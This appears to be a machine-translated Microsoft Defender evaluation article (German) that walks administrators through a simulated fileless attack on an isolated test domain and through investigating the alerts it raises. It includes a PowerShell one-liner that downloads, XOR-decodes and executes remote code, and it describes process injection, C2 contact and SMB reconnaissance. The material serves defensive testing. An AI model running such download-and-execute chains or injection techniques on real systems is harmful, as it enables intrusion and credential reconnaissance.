---
title: Ausführen einer Angriffssimulation in einer Microsoft 365 Defender Pilotumgebung, isolierte Umgebung für Angriffssimulation, Reaktion, Behebung
description: Führen Sie Angriffssimulationen für Microsoft 365 Defender aus, um zu sehen, wie Warnungen und Vorfälle dargestellt, Erkenntnisse gewonnen und Bedrohungen schnell behoben werden.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
ms.date: 07/09/2021
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: ebea0a8eeed737712c55eb80b9ce3c68e06853c1
ms.sourcegitcommit: 718759c7146062841f7eb4a0a9a8bdddce0139b0
ms.translationtype: MT
ms.contentlocale: de-DE
ms.lasthandoff: 07/15/2021
ms.locfileid: "53458150"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>Ausführen einer Angriffssimulation in einer Microsoft 365 Defender Pilotumgebung


Dieser Artikel ist [Schritt 1 von 2,](eval-defender-investigate-respond.md) um eine Untersuchung und Reaktion auf einen Vorfall in Microsoft 365 Defender mithilfe einer Pilotumgebung durchzuführen. Weitere Informationen zu diesem Prozess finden Sie im [Übersichtsartikel.](eval-defender-investigate-respond.md)

Nach der Vorbereitung Ihrer [Pilotumgebung](eval-defender-investigate-respond.md)ist es an der Zeit, die Reaktion auf Microsoft 365 Defender sowie die automatisierten Untersuchungs- und Behebungsfunktionen zu testen, indem Sie einen Vorfall mit einem simulierten Angriff erstellen und das Microsoft 365 Defender-Portal verwenden, um zu untersuchen und zu reagieren.

Ein Vorfall in Microsoft 365 Defender ist eine Sammlung korrelierter Warnungen und zugehöriger Daten, die die Geschichte eines Angriffs bilden.

Microsoft 365 Dienste und Apps erstellen Warnungen, wenn sie ein verdächtiges oder bösartiges Ereignis oder eine schädliche Aktivität erkennen. Einzelne Warnungen liefern wertvolle Hinweise zu einem abgeschlossenen oder laufenden Angriff. Bei Angriffen werden jedoch in der Regel verschiedene Techniken gegen verschiedene Entitätstypen verwendet, z. B. Geräte, Benutzer und Postfächer. Das Ergebnis sind mehrere Warnungen für mehrere Entitäten in Ihrem Mandanten.

>[!Note]
>Wenn Sie mit der Sicherheitsanalyse und der Reaktion auf Vorfälle völlig neu sind, lesen Sie die [exemplarische Vorgehensweise "Auf Ihren ersten Vorfall reagieren",](first-incident-overview.md) um sich einen geführten Überblick über einen typischen Prozess der Analyse, Wartung und Überprüfung nach dem Vorfall zu verschaffen.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>Simulieren von Angriffen mit dem Microsoft 365 Defender Portal

Das Microsoft 365 Defender-Portal verfügt über integrierte Funktionen, um simulierte Angriffe auf Ihre Pilotumgebung zu erstellen:

- Angriffssimulationstraining für Microsoft 365 Defender für Office 365 bei [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator) .
  
  Wählen Sie im portal Microsoft 365 Defender **E-Mail-& Zusammenarbeit > Angriffssimulationstraining** aus.

- Angriffslernprogramme & Simulationen für Microsoft 365 Defender für Endpunkte unter [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations) .

  Wählen Sie im Microsoft 365 Defender Portal **Endpunkte > Lernprogramme & Simulationen** aus.

### <a name="defender-for-office-365-attack-simulation-training"></a>Angriffssimulationstraining für Defender für Office 365

Defender für Office 365 mit Microsoft 365 E5 oder Microsoft Defender für Office 365 Plan 2 umfasst Angriffssimulationsschulungen für Phishingangriffe. Die grundlegenden Schritte sind:

1. Erstellen einer Simulation

   Schrittweise Anleitungen zum Erstellen und Senden einer neuen Simulation finden Sie unter [Simulieren eines Phishingangriffs.](/microsoft-365/security/office-365-security/attack-simulation-training)

2. Erstellen einer Nutzlast

   Schrittweise Anleitungen zum Erstellen einer Nutzlast für die Verwendung innerhalb einer Simulation finden Sie unter [Erstellen einer benutzerdefinierten Nutzlast für Angriffssimulationsschulungen.](/microsoft-365/security/office-365-security/attack-simulation-training-payloads)

3. Gewinnen von Einblicken

   Schritt-für-Schritt-Anleitungen zum Gewinnen von Erkenntnissen mit der Berichterstellung finden Sie unter ["Gewinnen von Einblicken durch Angriffssimulationsschulungen".](/microsoft-365/security/office-365-security/attack-simulation-training-insights)

Weitere Informationen finden Sie unter [Simulationen.](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations)

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Defender für Endpunkt-Angriffslernprogramme & Simulationen

Hier sind die Defender für Endpunkt-Simulationen von Microsoft:

- Dokument legt Hintertür ab
- Automatisierte Untersuchung (Hintertür)

Es gibt zusätzliche Simulationen von Attack GIF und SafeBreach. Es gibt auch eine Reihe von Lernprogrammen.

Für jede Simulation oder jedes Lernprogramm:

1. Laden Sie das entsprechende Walk-Through-Dokument herunter, das Mit Ihrer ausgewählten Simulation oder Ihrem ausgewählten Szenario bereitgestellt wird, und lesen Sie es.

2. Laden Sie die Simulationsdatei herunter. Sie können die Datei oder das Skript auf dem Testgerät herunterladen, dies ist jedoch nicht obligatorisch.

3. Führen Sie die Simulationsdatei oder das Skript auf dem Testgerät aus, wie im Exemplarischen Dokument beschrieben.

 Weitere Informationen finden Sie unter [Microsoft Defender für Endpunkt durch simulierten Angriff.](/microsoft-365/security/defender-endpoint/attack-simulations)

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>Simulieren eines Angriffs mit einem isolierten Domänencontroller und Clientgerät (optional)

In dieser optionalen Vorfallreaktionsübung simulieren Sie einen Angriff auf einen isolierten Active Directory Domain Services (AD DS)-Domänencontroller und Windows 10 Gerät mithilfe eines PowerShell-Skripts und untersuchen, beheben und beheben den Vorfall.

Zunächst müssen Sie Ihrer Pilotumgebung Endpunkte hinzufügen.

### <a name="add-pilot-environment-endpoints"></a>Hinzufügen von Pilotumgebungsendpunkten

Zunächst müssen Sie ihrer Pilotumgebung einen isolierten AD DS-Domänencontroller und ein Windows 10 Gerät hinzufügen.

1. Stellen Sie sicher, dass ihr Pilotumgebungsmandant [Microsoft 365 Defender aktiviert](m365d-enable.md#confirm-that-the-service-is-on)hat.

2. Stellen Sie sicher, dass Ihr Domänencontroller:

   - Führt Windows Server 2008 R2 oder höher aus.
   - Berichtet an [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) und hat die [Remoteverwaltung](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)aktiviert.
   - Aktiviert [Microsoft Defender for Identity und Microsoft Cloud App Security Integration.](/cloud-app-security/mdi-integration)
   - Hat einen Testbenutzer in der Testdomäne erstellt. Berechtigungen auf Administratorebene sind nicht erforderlich.

3. Stellen Sie sicher, dass Ihr Testgerät:

   - Führt Windows 10 Version 1903 oder höher aus.
   - Ist der AD DS-Domänencontrollerdomäne beigetreten.
   - Hat [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) aktiviert. Wenn Sie Probleme beim Aktivieren von Windows Defender Antivirus haben, lesen Sie dieses [Problembehandlungsthema.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)
   - Ist [in Microsoft Defender für Endpunkt integriert.](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

Wenn Sie Mandanten- und Gerätegruppen verwenden, erstellen Sie eine dedizierte Gerätegruppe für das Testgerät, und pushen Sie es auf die oberste Ebene.

Eine Alternative besteht darin, ihren AD DS-Domänencontroller zu hosten und das Gerät als virtuelle Computer in Microsoft Azure Infrastrukturdiensten zu testen. Sie können die Anweisungen in [Phase 1 des simulierten Enterprise-Testumgebungsanleitung](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet)verwenden, aber die Erstellung des virtuellen APP1-Computers überspringen.

Nachfolgend sehen Sie das Ergebnis.

![Endpunkte für Ihre Defender-Evaluierungsumgebung mithilfe des simulierten Enterprise Test Lab Guide](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png)

Sie simulieren einen komplexen Angriff, der erweiterte Techniken nutzt, um sich vor der Erkennung auszublenden. Der Angriff zählt geöffnete Server Message Block (SMB)-Sitzungen auf Domänencontrollern auf und ruft die letzten IP-Adressen der Geräte der Benutzer ab. Diese Kategorie von Angriffen umfasst in der Regel keine Dateien, die auf dem Gerät des Opfers abgelegt wurden und ausschließlich im Arbeitsspeicher auftreten. Sie "leben vom Land", indem sie vorhandene System- und Verwaltungstools verwenden und ihren Code in Systemprozesse einfügen, um ihre Ausführung auszublenden. Ein solches Verhalten ermöglicht es ihnen, die Erkennung zu umgehen und auf dem Gerät zu speichern.

In dieser Simulation beginnt unser Beispielszenario mit einem PowerShell-Skript. In der realen Welt wird ein Benutzer möglicherweise dazu betrogen, ein Skript auszuführen, oder das Skript kann von einer Remoteverbindung mit einem anderen Computer von einem zuvor infizierten Gerät ausgeführt werden, was darauf hinweist, dass der Angreifer versucht, sich seitlich im Netzwerk zu bewegen. Die Erkennung dieser Skripts kann schwierig sein, da Administratoren Skripts häufig auch remote ausführen, um verschiedene Administrative Aktivitäten auszuführen.

![Dateiloser PowerShell-Angriff mit Prozessinjektion und SMB-Reconnaisance-Angriffsdiagramm](../../media/mtp/mtpdiydiagram.png)

Während der Simulation fügt der Angriff Shellcode in einen scheinbar unerschwungenen Prozess ein. Das Szenario erfordert die Verwendung von notepad.exe. Wir haben diesen Prozess für die Simulation ausgewählt, aber Angreifer würden wahrscheinlich eher auf einen lange ausgeführten Systemprozess abzielen, z. B. svchost.exe. Die Shellcode kontaktiert dann den Befehls- und Steuerungsserver (C2) des Angreifers, um Anweisungen zum Weiteren zu erhalten. Das Skript versucht, Abstimmungsabfragen für den Domänencontroller (DC) auszuführen. Mit der Reconnaissance kann ein Angreifer Informationen über die letzten Benutzeranmeldeinformationen abrufen. Sobald Angreifer über diese Informationen verfügen, können sie sich seitlich im Netzwerk bewegen, um zu einem bestimmten vertraulichen Konto zu gelangen.

> [!IMPORTANT]
> Um optimale Ergebnisse zu erzielen, befolgen Sie die Anweisungen zur Angriffssimulation so genau wie möglich.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>Ausführen der isolierten AD DS-Domänencontroller-Angriffssimulation

So führen Sie die Simulation des Angriffsszenarios aus:

1. Stellen Sie sicher, dass Ihre Pilotumgebung den isolierten AD DS-Domänencontroller und Windows 10 Gerät enthält.

2. Melden Sie sich mit dem Testbenutzerkonto beim Testgerät an.

3. Öffnen Sie ein Windows PowerShell Fenster auf dem Testgerät.

4. Kopieren Sie das folgende Simulationsskript:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Wenn Sie diesen Artikel in einem Webbrowser öffnen, können Probleme beim Kopieren des Vollständigtexts auftreten, ohne bestimmte Zeichen zu verlieren oder zusätzliche Zeilenumbrüche zu verursachen. Wenn dies der Fall ist, laden Sie dieses Dokument herunter, und öffnen Sie es in Adobe Reader.

5. Fügen Sie das kopierte Skript in das PowerShell-Fenster ein, und führen Sie es aus.

> [!NOTE]
> Wenn Sie PowerShell mithilfe des Remotedesktopprotokolls (RDP) ausführen, verwenden Sie den Befehl "Text der Zwischenablage eingeben" im RDP-Client, da die **STRG-V-Hotkey-** oder Right-Click-Paste-Methode möglicherweise nicht funktioniert. Aktuelle Versionen von PowerShell akzeptieren diese Methode manchmal auch nicht. Möglicherweise müssen Sie sie zuerst in Editor im Arbeitsspeicher kopieren, auf dem virtuellen Computer kopieren und dann in PowerShell einfügen.

Einige Sekunden später wird die Editor App geöffnet. Ein simulierter Angriffscode wird in Editor eingefügt. Lassen Sie die automatisch generierte Editor Instanz geöffnet, um das vollständige Szenario zu erleben.

Der simulierte Angriffscode versucht, mit einer externen IP-Adresse zu kommunizieren (den C2-Server zu simulieren) und dann über SMB eine Reconnaissance für den Domänencontroller zu versuchen.

Diese Meldung wird auf der PowerShell-Konsole angezeigt, wenn dieses Skript abgeschlossen ist:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Um das Feature "Automatisierter Vorfall und Reaktion" in Aktion zu sehen, lassen Sie den notepad.exe Prozess geöffnet. Sie sehen, dass automatisierte Vorfälle und Reaktionen den Editor-Prozess beenden.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>Untersuchen des Vorfalls auf den simulierten Angriff

> [!NOTE]
> Bevor wir Sie durch diese Simulation führen, sehen Sie sich das folgende Video an, um zu sehen, wie die Vorfallverwaltung Ihnen hilft, die zugehörigen Warnungen im Rahmen des Untersuchungsprozesses zusammenzuarbeiten, wo Sie sie im Portal finden können und wie sie Ihnen bei Ihren Sicherheitsvorgängen helfen können:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Wenn Sie zur SOC-Analystenansicht wechseln, können Sie jetzt mit der Untersuchung des Angriffs im Microsoft 365 Defender-Portal beginnen.

1. Öffnen Sie das [Microsoft 365 Defender Portal.](https://security.microsoft.com/)

2. Wählen Sie im Navigationsbereich **Vorfälle & Warnungen > Vorfälle aus.**

3. Der neue Vorfall für den simulierten Angriff wird in der Vorfallwarteschlange angezeigt.

    ![Beispiel für die Vorfallwarteschlange](../../media/mtp/fig2.png)

#### <a name="investigate-the-attack-as-a-single-incident"></a>Untersuchen des Angriffs als einzelner Vorfall

Microsoft 365 Defender korreliert Analysen und aggregiert alle zugehörigen Warnungen und Untersuchungen aus verschiedenen Produkten in einer Vorfallentität. Auf diese Weise zeigt Microsoft 365 Defender eine umfassendere Angriffsstory, die es dem SOC-Analysten ermöglicht, komplexe Bedrohungen zu verstehen und darauf zu reagieren.

Die während dieser Simulation generierten Warnungen sind derselben Bedrohung zugeordnet und werden daher automatisch als einzelner Vorfall aggregiert.

So zeigen Sie den Vorfall an:

1. Öffnen Sie das [Microsoft 365 Defender Portal.](https://security.microsoft.com/)

2. Wählen Sie im Navigationsbereich **Vorfälle & Warnungen > Vorfälle aus.**

3. Wählen Sie das neueste Element aus, indem Sie auf den Kreis links neben dem Vorfallnamen klicken. In einem Seitenbereich werden zusätzliche Informationen zu dem Vorfall angezeigt, einschließlich aller zugehörigen Warnungen. Jeder Vorfall hat einen eindeutigen Namen, der ihn basierend auf den Attributen der enthaltenen Warnungen beschreibt.

   Die im Dashboard angezeigten Warnungen können basierend auf Dienstressourcen gefiltert werden: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender für Endpunkt, Microsoft 365 Defender und Microsoft Defender für Office 365.

3. Wählen Sie **die Seite "Vorfall öffnen"** aus, um weitere Informationen zu dem Vorfall zu erhalten.

   Auf der **Seite "Vorfall"** können Sie alle Warnungen und Informationen im Zusammenhang mit dem Vorfall anzeigen. Die Informationen umfassen die Entitäten und Ressourcen, die an der Warnung beteiligt sind, die Erkennungsquelle der Warnungen (z. B. Microsoft Defender for Identity oder Microsoft Defender für Endpunkt) und den Grund, warum sie miteinander verknüpft wurden. Die Überprüfung der Warnungsliste für Vorfälle zeigt den Verlauf des Angriffs an. Aus dieser Ansicht können Sie die einzelnen Warnungen sehen und untersuchen.

   Sie können auch im rechten Menü auf **"Vorfall verwalten"** klicken, um den Vorfall zu kennzeichnen, sich selbst zuzuweisen und Kommentare hinzuzufügen.

#### <a name="review-generated-alerts"></a>Überprüfen generierter Warnungen

Sehen wir uns einige der Warnungen an, die während des simulierten Angriffs generiert wurden.

> [!NOTE]
> Wir werden nur einige der Warnungen durchgehen, die während des simulierten Angriffs generiert wurden. Abhängig von der Version von Windows und den Microsoft 365 Defender Produkten, die auf Ihrem Testgerät ausgeführt werden, werden möglicherweise weitere Warnungen angezeigt, die in einer etwas anderen Reihenfolge angezeigt werden.

![Beispiel für die generierten Warnungen](../../media/mtp/fig6.png)

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>Warnung: Verdächtige Prozesseinschleusung beobachtet (Quelle: Microsoft Defender für Endpunkt)

Fortgeschrittene Angreifer verwenden ausgefeilte und bösartige Methoden, um im Arbeitsspeicher zu bleiben und sich vor Erkennungstools zu verbergen. Eine gängige Technik besteht darin, innerhalb eines vertrauenswürdigen Systemprozesses zu arbeiten, anstatt eine schädliche ausführbare Datei zu verwenden, wodurch es für Erkennungstools und Sicherheitsvorgänge schwierig wird, den schädlichen Code zu erkennen.

Damit die SOC-Analysten diese erweiterten Angriffe abfangen können, bieten tiefe Speichersensoren in Microsoft Defender für Endpunkt unserem Clouddienst einen beispiellosen Einblick in eine Vielzahl von prozessübergreifenden Codeeinfügungstechniken. Die folgende Abbildung zeigt, wie Defender für Endpunkt beim Versuch, Code in <i>notepad.exe</i>einzufügen, erkannt und benachrichtigt wurde.

![Beispiel für die Warnung zur Einschleusung von potenziell schädlichem Code](../../media/mtp/fig7.png)

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>Warnung: Unerwartetes Verhalten, das von einem Prozess ohne Befehlszeilenargumente beobachtet wird (Quelle: Microsoft Defender für Endpunkt)

Microsoft Defender für Endpunkt-Erkennungen zielen häufig auf das am häufigsten verwendete Attribut einer Angriffstechnik ab. Diese Methode stellt Dies sicher und erhöht die Messlatte für Angreifer, um zu neueren Taktiken zu wechseln.

Wir verwenden umfangreiche Lernalgorithmen, um das normale Verhalten gängiger Prozesse innerhalb einer Organisation und weltweit zu ermitteln und zu beobachten, wann diese Prozesse anomales Verhalten aufweisen. Diese anomaalen Verhaltensweisen weisen häufig darauf hin, dass fremder Code eingeführt wurde und in einem ansonsten vertrauenswürdigen Prozess ausgeführt wird.

In diesem Szenario weist der Prozess <i>notepad.exe</i> ein ungewöhnliches Verhalten auf, das die Kommunikation mit einem externen Standort einschließt. Dieses Ergebnis ist unabhängig von der spezifischen Methode, die zum Einführen und Ausführen des schädlichen Codes verwendet wird.

> [!NOTE]
> Da diese Warnung auf Machine Learning-Modellen basiert, die eine zusätzliche Back-End-Verarbeitung erfordern, kann es einige Zeit dauern, bis diese Warnung im Portal angezeigt wird.

Beachten Sie, dass die Warnungsdetails die externe IP-Adresse enthalten – ein Indikator, den Sie als Pivot verwenden können, um die Untersuchung zu erweitern.

Wählen Sie die IP-Adresse in der Warnungsprozessstruktur aus, um die Seite mit den IP-Adressdetails anzuzeigen.

![Beispiel für die Warnung für unerwartetes Verhalten durch einen Prozess ohne Befehlszeilenargumente](../../media/mtp/fig8.png)

In der folgenden Abbildung wird die ausgewählte Seite mit den IP-Adressdetails angezeigt (klicken Sie in der Struktur des Warnungsprozesses auf die IP-Adresse).

![Beispiel für die Ip-Adressdetailseite](../../media/mtp/fig9.png)

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Warnung: Benutzer- und IP-Adress-Reconnaissance (SMB) (Quelle: Microsoft Defender for Identity)

Die Aufzählung mithilfe des SMB-Protokolls (Server Message Block) ermöglicht Es Angreifern, aktuelle Benutzeranmeldeinformationen abzurufen, mit denen sie seitlich durch das Netzwerk navigieren können, um auf ein bestimmtes vertrauliches Konto zuzugreifen.

Bei dieser Erkennung wird eine Warnung ausgelöst, wenn die SMB-Sitzungsenumeration für einen Domänencontroller ausgeführt wird.

![Beispiel für die Microsoft Defender for Identity-Warnung für die Benutzer- und IP-Adressaufklärung](../../media/mtp/fig10.png)

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>Überprüfen der Gerätezeitachse mit Microsoft Defender für Endpunkt

Nachdem Sie die verschiedenen Warnungen in diesem Vorfall untersucht haben, navigieren Sie zurück zu der Vorfallseite, die Sie zuvor untersucht haben. Wählen Sie die Registerkarte **"Geräte"** auf der Vorfallseite aus, um die an diesem Vorfall beteiligten Geräte zu überprüfen, wie von Microsoft Defender für Endpunkt und Microsoft Defender for Identity gemeldet.

Wählen Sie den Namen des Geräts aus, auf dem der Angriff ausgeführt wurde, um die Entitätsseite für dieses bestimmte Gerät zu öffnen. Auf dieser Seite können Sie Warnungen sehen, die ausgelöst wurden, und verwandte Ereignisse.

Wählen Sie die Registerkarte **"Zeitachse"** aus, um die Gerätezeitachse zu öffnen und alle auf dem Gerät beobachteten Ereignisse und Verhaltensweisen in chronologischer Reihenfolge anzuzeigen, durchsetzt mit den ausgelösten Warnungen.

![Beispiel für die Gerätezeitachse mit Verhaltensweisen](../../media/mtp/fig11.png)

Das Erweitern einiger der interessanteren Verhaltensweisen liefert nützliche Details, z. B. Prozessstrukturen.

Scrollen Sie beispielsweise nach unten, bis Sie das Warnungsereignis **"Verdächtige Prozessinjektion" gefunden haben.** Wählen Sie diepowershell.exe aus, die **in notepad.exe Prozessereignis** darunter eingefügt wurde, um die vollständige Prozessstruktur für dieses Verhalten unter dem Diagramm **"Ereignisentitäten"** im Seitenbereich anzuzeigen. Verwenden Sie bei Bedarf die Suchleiste zum Filtern.

![Beispiel für die Prozessstruktur für ausgewähltes PowerShell-Dateierstellungsverhalten](../../media/mtp/fig12.png)

#### <a name="review-the-user-information-with-microsoft-cloud-app-security"></a>Überprüfen der Benutzerinformationen mit Microsoft Cloud App Security

Wählen Sie auf der Vorfallseite die Registerkarte **"Benutzer"** aus, um die Liste der an dem Angriff beteiligten Benutzer anzuzeigen. Die Tabelle enthält zusätzliche Informationen zu jedem Benutzer, einschließlich der Bewertung der **Untersuchungspriorität** jedes Benutzers.

Wählen Sie den Benutzernamen aus, um die Profilseite des Benutzers zu öffnen, auf der weitere Untersuchungen durchgeführt werden können. [Weitere Informationen zur Untersuchung riskanter Benutzer.](/cloud-app-security/tutorial-ueba#identify)

![Beispiel für Cloud App Security Benutzerseite](../../media/mtp/fig13.png)

#### <a name="automated-investigation-and-remediation"></a>Automatische Untersuchung und Reaktion

> [!NOTE]
>Bevor wir Sie durch diese Simulation führen, sehen Sie sich das folgende Video an, um sich mit der automatisierten Selbstkorrektur vertraut zu machen, wo sie im Portal zu finden ist und wie sie bei Ihren Sicherheitsvorgängen helfen kann:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Navigieren Sie im Microsoft 365 Defender Portal zurück zu dem Vorfall. Auf der Registerkarte **"Untersuchungen"** auf der **Seite "Vorfall"** werden die automatisierten Untersuchungen angezeigt, die von Microsoft Defender for Identity und Microsoft Defender für Endpunkt ausgelöst wurden. Der screenshot unten zeigt nur die automatisierte Untersuchung, die von Defender für Endpunkt ausgelöst wurde. Standardmäßig behebt Defender für Endpunkt automatisch die Artefakte in der Warteschlange, was eine Korrektur erfordert.

![Beispiel für automatisierte Untersuchungen im Zusammenhang mit dem Vorfall](../../media/mtp/fig14.png)

Wählen Sie die Warnung aus, die eine Untersuchung ausgelöst hat, um die Seite **"Untersuchungsdetails"** zu öffnen. Die folgenden Details werden angezeigt:

- Warnungen, die die automatisierte Untersuchung ausgelöst haben.
- Betroffene Benutzer und Geräte. Wenn Indikatoren auf zusätzlichen Geräten gefunden werden, werden auch diese zusätzlichen Geräte aufgeführt.
- Liste der Nachweise. Die gefundenen und analysierten Entitäten, z. B. Dateien, Prozesse, Dienste, Treiber und Netzwerkadressen. Diese Entitäten werden auf mögliche Beziehungen zur Warnung analysiert und als gutartig oder bösartig eingestuft.
- Bedrohungen gefunden. Bekannte Bedrohungen, die während der Untersuchung gefunden werden.

> [!NOTE]
> Je nach Zeitpunkt kann die automatisierte Untersuchung noch ausgeführt werden. Warten Sie einige Minuten, bis der Prozess abgeschlossen ist, bevor Sie die Nachweise sammeln und analysieren und die Ergebnisse überprüfen. Aktualisieren Sie die **Seite "Untersuchungsdetails",** um die neuesten Ergebnisse zu erhalten.

![Beispiel für die Seite "Untersuchungsdetails"](../../media/mtp/fig15.png)

Während der automatisierten Untersuchung hat Microsoft Defender für Endpunkt den notepad.exe Prozess identifiziert, der als eines der Artefakte eingefügt wurde, die eine Korrektur erfordern. Defender für Endpunkt stoppt automatisch die verdächtige Prozesseinschleusung als Teil der automatisierten Korrektur.

Sie können <i> sehen,notepad.exe</i> aus der Liste der ausgeführten Prozesse auf dem Testgerät ausgeblendet werden.

#### <a name="resolve-the-incident"></a>Beheben des Vorfalls

Nachdem die Untersuchung abgeschlossen ist und bestätigt wurde, dass sie behoben wird, beheben Sie den Vorfall.

Wählen Sie auf der Seite **"Vorfall"** die Option **"Vorfall verwalten"** aus. Legen Sie den Status auf **"Vorfall beheben"** fest, und wählen Sie **"True"-Warnung** für die Klassifizierung und **die Sicherheitstests** für die Ermittlung aus.

![Beispiel für die Seite "Vorfälle" mit dem geöffneten Bereich "Vorfall verwalten", auf dem Sie auf die Option zum Beheben von Vorfällen klicken können.](../../media/mtp/fig16.png)

Wenn der Vorfall behoben ist, werden alle zugehörigen Warnungen in Microsoft 365 Defender Portal und in den zugehörigen Portalen aufgelöst.

Dies schließt die Angriffssimulation für die Vorfallanalyse, automatisierte Untersuchung und Vorfalllösung ein.

## <a name="next-step"></a>Nächster Schritt

[![Testen Microsoft 365 Defender Funktionen für die Reaktion auf Sicherheitsvorfälle](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)

Schritt 2 von 2: [Testen Microsoft 365 Defender Vorfallreaktionsfunktionen](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>Navigation, die Sie möglicherweise benötigen

[Erstellen der Microsoft 365 Defender-Evaluierungsumgebung](eval-create-eval-environment.md)
